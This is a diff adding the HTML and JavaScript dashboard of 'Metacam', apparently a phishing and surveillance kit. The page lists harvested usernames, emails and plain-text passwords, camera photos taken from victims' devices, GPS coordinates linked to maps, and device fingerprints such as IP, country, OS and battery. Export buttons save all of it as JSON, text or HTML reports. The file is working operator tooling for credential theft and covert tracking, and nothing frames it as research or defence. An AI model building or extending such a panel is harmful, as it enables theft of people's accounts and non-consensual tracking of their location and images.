@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Metacam &mdash; Dashboard</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d0d0d;color:#e0e0e0;font-family:'Courier New',monospace}
+.topbar{background:#0a0a0a;border-bottom:1px solid #1a1a1a;padding:0.75rem 2rem;display:flex;align-items:center;justify-content:space-between}
+.topbar-logo{color:#00d4aa;font-weight:bold;letter-spacing:3px;font-size:1rem}
+.topbar-right{display:flex;align-items:center;gap:1rem}
+.clock{color:#555;font-size:0.8rem}
+.logout-btn{background:transparent;border:1px solid #2a2a2a;color:#888;padding:0.35rem 0.85rem;border-radius:4px;cursor:pointer;font-family:'Courier New',monospace;font-size:0.75rem;transition:all 0.2s}
+.logout-btn:hover{border-color:#ff6b6b;color:#ff6b6b}
+.main{padding:2rem;max-width:1400px;margin:0 auto}
+.stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:1rem;margin-bottom:2rem}
+.stat-card{background:#111;border:1px solid #1e1e1e;border-radius:10px;padding:1.25rem 1.5rem}
+.stat-card .label{color:#555;font-size:0.7rem;letter-spacing:2px;text-transform:uppercase}
+.stat-card .value{color:#00d4aa;font-size:2.25rem;font-weight:bold;margin-top:0.25rem}
+.section-title{color:#00d4aa;font-size:0.85rem;letter-spacing:2px;text-transform:uppercase;border-bottom:1px solid #1e1e1e;padding-bottom:0.5rem;margin:2rem 0 1rem}
+.export-bar{display:flex;gap:0.75rem;margin-bottom:2rem;flex-wrap:wrap}
+.export-btn{background:#111;border:1px solid #2a2a2a;color:#00d4aa;padding:0.5rem 1.25rem;border-radius:6px;cursor:pointer;font-family:'Courier New',monospace;font-size:0.8rem;letter-spacing:1px;transition:all 0.2s}
+.export-btn:hover{background:#1a1a1a;border-color:#00d4aa}
+table{width:100%;border-collapse:collapse;background:#111;border-radius:10px;overflow:hidden;margin-bottom:2rem}
+th{background:#161616;color:#00d4aa;padding:0.7rem 1rem;text-align:left;font-size:0.7rem;letter-spacing:1px;text-transform:uppercase;border-bottom:1px solid #1e1e1e}
+td{padding:0.7rem 1rem;border-bottom:1px solid #161616;font-size:0.8rem;word-break:break-all;vertical-align:top}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:#141414}
+.badge{display:inline-block;padding:0.15rem 0.5rem;border-radius:3px;font-size:0.72rem}
+.badge-green{background:#0a2016;color:#00d4aa;border:1px solid #00d4aa}
+.badge-yellow{background:#1e1800;color:#ffd700;border:1px solid #555}
+.badge-red{background:#1e0a0a;color:#ff6b6b;border:1px solid #ff6b6b}
+.gps-link{color:#4a9eff;text-decoration:none}
+.gps-link:hover{text-decoration:underline}
+.camera-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:1rem;margin-bottom:2rem}
+.camera-card{background:#111;border:1px solid #1e1e1e;border-radius:10px;overflow:hidden}
+.camera-card img{width:100%;display:block;aspect-ratio:16/9;object-fit:cover}
+.camera-card .cam-info{padding:0.5rem 0.75rem;font-size:0.7rem;color:#555}
+.empty{color:#333;font-size:0.85rem;padding:2rem;text-align:center;border:1px dashed #1e1e1e;border-radius:8px}
+.toast{position:fixed;bottom:2rem;right:2rem;background:#00d4aa;color:#0d0d0d;padding:0.75rem 1.5rem;border-radius:6px;font-size:0.8rem;font-weight:bold;display:none;z-index:9999}
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="topbar-logo">METACAM</div>
+  <div class="topbar-right">
+    <div class="clock" id="Clock"></div>
+    <form method="POST" action="/status/logout" style="display:inline">
+      <button class="logout-btn" type="submit">LOGOUT</button>
+    </form>
+  </div>
+</div>
+
+<div class="main">
+  <div class="stats" id="StatsGrid">
+    <div class="stat-card"><div class="label">Device Captures</div><div class="value" id="StatDevices">—</div></div>
+    <div class="stat-card"><div class="label">Credentials</div><div class="value" id="StatForms">—</div></div>
+    <div class="stat-card"><div class="label">Camera Images</div><div class="value" id="StatImages">—</div></div>
+    <div class="stat-card"><div class="label">GPS Locations</div><div class="value" id="StatGps">—</div></div>
+  </div>
+
+  <div class="export-bar">
+    <button class="export-btn" onclick="ExportJson()">EXPORT JSON</button>
+    <button class="export-btn" onclick="ExportTxt()">EXPORT TXT</button>
+    <button class="export-btn" onclick="ExportReport()">HTML REPORT</button>
+    <button class="export-btn" onclick="LoadAll()">REFRESH</button>
+  </div>
+
+  <div class="section-title">Captured Credentials</div>
+  <div id="FormsContainer"><div class="empty">No credentials captured yet.</div></div>
+
+  <div class="section-title">Camera Captures</div>
+  <div class="camera-grid" id="CameraGrid"><div class="empty">No camera images yet.</div></div>
+
+  <div class="section-title">Device Captures</div>
+  <div id="CapturesContainer"><div class="empty">No device captures yet.</div></div>
+</div>
+
+<div class="toast" id="Toast"></div>
+
+<script>
+function UpdateClock() {
+  document.getElementById("Clock").textContent = new Date().toLocaleString();
+}
+setInterval(UpdateClock, 1000);
+UpdateClock();
+
+function ShowToast(Message) {
+  const Toast = document.getElementById("Toast");
+  Toast.textContent = Message;
+  Toast.style.display = "block";
+  setTimeout(function () { Toast.style.display = "none"; }, 3000);
+}
+
+function LoadStats() {
+  fetch("/status/api/stats").then(function (R) { return R.json(); }).then(function (Data) {
+    document.getElementById("StatDevices").textContent = Data.DeviceCaptures;
+    document.getElementById("StatForms").textContent = Data.FormCaptures;
+    document.getElementById("StatImages").textContent = Data.CameraImages;
+    document.getElementById("StatGps").textContent = Data.GpsLocations;
+  }).catch(function () {});
+}
+
+function LoadForms() {
+  fetch("/status/api/forms").then(function (R) { return R.json(); }).then(function (Forms) {
+    const Container = document.getElementById("FormsContainer");
+    if (!Forms || Forms.length === 0) {
+      Container.innerHTML = "<div class=\"empty\">No credentials captured yet.</div>";
+      return;
+    }
+    let Html = "<table><thead><tr><th>#</th><th>Username / Email</th><th>Password</th><th>IP</th><th>Country</th><th>Timestamp</th></tr></thead><tbody>";
+    Forms.forEach(function (Form, Idx) {
+      Html += "<tr>";
+      Html += "<td>" + (Idx + 1) + "</td>";
+      Html += "<td>" + Escape(Form.Username || Form.Email || "") + "</td>";
+      Html += "<td><span class=\"badge badge-yellow\">" + Escape(Form.Password || "") + "</span></td>";
+      Html += "<td>" + Escape(Form.IpAddress || "") + "</td>";
+      Html += "<td>" + Escape(Form.IpCountry || "") + "</td>";
+      Html += "<td>" + Escape(Form.Timestamp || "") + "</td>";
+      Html += "</tr>";
+    });
+    Html += "</tbody></table>";
+    Container.innerHTML = Html;
+  }).catch(function () {});
+}
+
+function LoadCaptures() {
+  fetch("/status/api/captures").then(function (R) { return R.json(); }).then(function (Captures) {
+    const Container = document.getElementById("CapturesContainer");
+    const CameraGrid = document.getElementById("CameraGrid");
+    if (!Captures || Captures.length === 0) {
+      Container.innerHTML = "<div class=\"empty\">No device captures yet.</div>";
+      CameraGrid.innerHTML = "<div class=\"empty\">No camera images yet.</div>";
+      return;
+    }
+
+    let CameraHtml = "";
+    Captures.forEach(function (Cap, Idx) {
+      if (Cap.CameraImageFile && Cap.CameraImageFile !== "Not Available" && Cap.CameraImageFile !== "Upload Failed" && Cap.CameraImageFile !== "Permission Denied") {
+        CameraHtml += "<div class=\"camera-card\"><img src=\"/images/" + Escape(Cap.CameraImageFile) + "\" onerror=\"this.parentElement.style.display='none'\"><div class=\"cam-info\">#" + (Idx + 1) + " &mdash; " + Escape(Cap.IpAddress || "") + "</div></div>";
+      }
+    });
+    CameraGrid.innerHTML = CameraHtml || "<div class=\"empty\">No camera images yet.</div>";
+
+    let Html = "<table><thead><tr><th>#</th><th>IP</th><th>Country</th><th>Device</th><th>OS</th><th>Browser</th><th>GPS</th><th>Battery</th><th>Connection</th><th>Timestamp</th></tr></thead><tbody>";
+    Captures.forEach(function (Cap, Idx) {
+      const Lat = Cap.GpsLatitude || "";
+      const Lon = Cap.GpsLongitude || "";
+      const HasGps = Lat && Lat !== "Permission Denied" && Lat !== "Not Available";
+      Html += "<tr>";
+      Html += "<td>" + (Idx + 1) + "</td>";
+      Html += "<td>" + Escape(Cap.IpAddress || "") + "</td>";
+      Html += "<td>" + Escape(Cap.IpCountry || "") + "</td>";
+      Html += "<td>" + Escape((Cap.DeviceBrand || "") + " " + (Cap.DeviceModel || "")) + "</td>";
+      Html += "<td>" + Escape((Cap.OperatingSystem || "") + " " + (Cap.OperatingSystemVersion || "")) + "</td>";
+      Html += "<td>" + Escape((Cap.Browser || "") + " " + (Cap.BrowserVersion || "")) + "</td>";
+      if (HasGps) {
+        Html += "<td><a class=\"gps-link\" href=\"https://maps.google.com/?q=" + Lat + "," + Lon + "\" target=\"_blank\">" + Lat + ", " + Lon + "</a></td>";
+      } else {
+        Html += "<td><span class=\"badge badge-red\">No GPS</span></td>";
+      }
+      Html += "<td>" + Escape(Cap.BatteryLevel || "") + "</td>";
+      Html += "<td>" + Escape(Cap.EffectiveConnectionType || "") + " " + Escape(Cap.DownlinkMbps ? Cap.DownlinkMbps + " Mbps" : "") + "</td>";
+      Html += "<td>" + Escape(Cap.Timestamp || "") + "</td>";
+      Html += "</tr>";
+    });
+    Html += "</tbody></table>";
+    Container.innerHTML = Html;
+  }).catch(function () {});
+}
+
+function Escape(Text) {
+  return String(Text).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
+}
+
+function ExportJson() {
+  fetch("/status/api/export-json", { method: "POST" }).then(function (R) { return R.json(); }).then(function (Data) {
+    ShowToast("JSON exported: " + (Data.File || ""));
+  }).catch(function () { ShowToast("Export failed"); });
+}
+
+function ExportTxt() {
+  fetch("/status/api/export-txt", { method: "POST" }).then(function (R) { return R.json(); }).then(function (Data) {
+    ShowToast("TXT exported: " + (Data.File || ""));
+  }).catch(function () { ShowToast("Export failed"); });
+}
+
+function ExportReport() {
+  fetch("/status/api/export-report", { method: "POST" }).then(function (R) { return R.json(); }).then(function (Data) {
+    ShowToast("HTML report: " + (Data.File || ""));
+  }).catch(function () { ShowToast("Report failed"); });
+}
+
+function LoadAll() {
+  LoadStats();
+  LoadForms();
+  LoadCaptures();
+}
+
+LoadAll();
+setInterval(LoadAll, 20000);
+</script>
+</body>
+</html>
